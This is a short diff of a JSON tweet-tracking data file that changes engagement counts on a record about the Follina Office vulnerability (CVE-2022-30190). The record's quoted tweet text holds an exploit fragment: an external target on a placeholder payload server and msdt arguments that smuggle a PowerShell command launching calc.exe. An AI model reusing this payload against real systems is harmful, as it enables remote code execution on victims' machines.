@@ -803,8 +803,8 @@
     "expanded_url": [
         "https://github.com/PwnC00re/PoC-CVE-2022-30190?fbclid=IwAR07oJZ7iL0ZyuAXNOflJyttKodx7Tba9Zmp_38ulPpZHpi6GgCc4eYMxZg"
     ],
-    "tweetfavorites": 329,
-    "tweetquotes": 4,
+    "tweetfavorites": 327,
+    "tweetquotes": 3,
     "tweetreplies": 1,
     "tweetretweets": 138,
     "tweettext": "0-day [CVE-2022-30190] MS Offic RCE aka msdt follina\n\nTarget = \"http://&lt;payload_server&gt;/payload.html!\"\nTargetMode = \"External\"\n\nIT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../Windows/System32\n\nhttps://t.co/Bci6gVBWJn https://t.co/hc2TcRoOQt",
